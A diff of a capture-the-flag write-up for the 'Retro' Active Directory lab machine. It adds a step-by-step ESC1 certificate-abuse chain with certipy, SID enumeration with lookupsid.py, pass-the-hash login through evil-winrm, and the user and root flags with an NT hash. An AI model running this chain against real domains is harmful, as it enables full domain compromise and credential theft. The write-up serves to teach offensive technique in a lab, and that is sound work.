@@ -264,10 +264,22 @@ smb: \> ls
   ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
   user.txt                            A       32  Wed Apr  9 05:13:01 2025
 
-		4659711 blocks of size 4096. 1326667 blocks available
+		4659711 blocks of size 4096. 1325185 blocks available
 smb: \> get ToDo.txt 
-getting file \ToDo.txt of size 248 as ToDo.txt (1,2 KiloBytes/sec) (average 1,2 KiloBytes/sec)
-smb: \>
+getting file \ToDo.txt of size 248 as ToDo.txt (1,5 KiloBytes/sec) (average 1,5 KiloBytes/sec)
+smb: \> get user.txt 
+getting file \user.txt of size 32 as user.txt (0,2 KiloBytes/sec) (average 0,9 KiloBytes/sec)
+```
+
+<br />
+
+The `user.txt` contains the flag:
+
+<br />
+
+```bash
+❯ cat user.txt
+cbda362cff2099072c5e96c51712ff33
 ```
 
 <br />
@@ -343,7 +355,7 @@ At this point we should change the password of the pre-created account using the
 <br />
 
 ```bash
-❯ python3 rpcchangepwd.py retro.vl/Banking\$:banking@10.129.234.44 -newpass 'NewPass123!'
+❯ python3 rpcchangepwd.py retro.vl/Banking\$:banking@10.129.28.100 -newpass 'NewPass123!'
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Password was changed successfully.
@@ -361,4 +373,250 @@ However, if we try to obtain remote access to the machine via WinRM or search fo
 
 <br />
 
+A simple `Certipy` one-liner noticed us of a vulnerable template:
 
+<br />
+
+```bash
+❯ certipy find -vulnerable -u 'BANKING$@retro.vl' -p 'NewPass123!' -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'retro-DC-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : retro-DC-CA
+    DNS Name                            : DC.retro.vl
+    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
+    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
+    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
+    Certificate Validity End            : 2028-07-23 21:13:50+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : RETRO.VL\Administrators
+      Access Rights
+        ManageCertificates              : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        ManageCa                        : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Enroll                          : RETRO.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : RETRO.VL\Administrator
+        Write Owner Principals          : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+        Write Dacl Principals           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+        Write Property Principals       : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+```
+
+<br />
+
+The template is named "RetroClients" and it's vulnerable to `ESC1`.
+
+<br />
+
+## ESC1 
+
+<br />
+
+This vulnerability allows an attacker to request a certificate for any account in the domain, including the `Administrator` one.
+
+To exploit this, we will request a new certificate using the `UPN` -> `administrator@retro.vl`.
+
+<br />
+
+```bash
+❯ certipy req -u 'BANKING$@retro.vl' -p 'NewPass123!' -upn 'administrator@retro.vl' -ca retro-DC-CA -template RetroClients -key-size 4096
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'administrator@retro.vl'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+<br />
+
+Now we use this certificate to authenticate as the administrator user:
+
+<br />
+
+```bash
+❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.28.100
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@retro.vl
+[*] Trying to get TGT...
+[-] Object SID mismatch between certificate and user 'administrator'
+```
+
+<br />
+
+There is an error: `Object SID mismatch`.
+
+This error means that SID of the host doesn't match with the SID of our certificate.
+
+We can retrieve the valid SID using `lookupsid.py`:
+
+<br />
+
+```bash
+❯ lookupsid.py retro.vl/BANKING$:'NewPass123!'@retro.vl
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Brute forcing SIDs at retro.vl
+[*] StringBinding ncacn_np:retro.vl[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
+498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: RETRO\Administrator (SidTypeUser)
+501: RETRO\Guest (SidTypeUser)
+502: RETRO\krbtgt (SidTypeUser)
+512: RETRO\Domain Admins (SidTypeGroup)
+513: RETRO\Domain Users (SidTypeGroup)
+514: RETRO\Domain Guests (SidTypeGroup)
+515: RETRO\Domain Computers (SidTypeGroup)
+516: RETRO\Domain Controllers (SidTypeGroup)
+517: RETRO\Cert Publishers (SidTypeAlias)
+518: RETRO\Schema Admins (SidTypeGroup)
+519: RETRO\Enterprise Admins (SidTypeGroup)
+520: RETRO\Group Policy Creator Owners (SidTypeGroup)
+521: RETRO\Read-only Domain Controllers (SidTypeGroup)
+522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
+525: RETRO\Protected Users (SidTypeGroup)
+526: RETRO\Key Admins (SidTypeGroup)
+527: RETRO\Enterprise Key Admins (SidTypeGroup)
+553: RETRO\RAS and IAS Servers (SidTypeAlias)
+571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
+572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
+1000: RETRO\DC$ (SidTypeUser)
+1101: RETRO\DnsAdmins (SidTypeAlias)
+1102: RETRO\DnsUpdateProxy (SidTypeGroup)
+1104: RETRO\trainee (SidTypeUser)
+1106: RETRO\BANKING$ (SidTypeUser)
+1107: RETRO\jburley (SidTypeUser)
+1108: RETRO\HelpDesk (SidTypeGroup)
+1109: RETRO\tblack (SidTypeUser)
+```
+
+<br />
+
+Then, we request the certificate again indicating this SID:
+
+<br />
+
+```bash
+❯ certipy req -u 'BANKING$@retro.vl' -p 'NewPass123!' -upn 'administrator@retro.vl' -ca retro-DC-CA -template RetroClients -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 12
+[*] Got certificate with UPN 'administrator@retro.vl'
+[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+<br />
+
+Now, we can use it with the auth command without without any problem:
+
+<br />
+
+```bash
+❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.28.100
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@retro.vl
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
+```
+
+<br />
+
+The retrieved hash allows us to log in as `administrator` using `evil-winrm`
+
+<br />
+
+```bash
+❯ evil-winrm -i retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+retro\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DC
+```
+
+<br />
+
+The `root.txt` flag was successfully retrieved:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+40fce9c3f09024bcab29d377eexxxxxx
+```
+
+<br />
+
+The system is already compromised.
+
+Hope you learned a lot and enjoyed this writeup.
+
+Keep hacking!❤️❤️
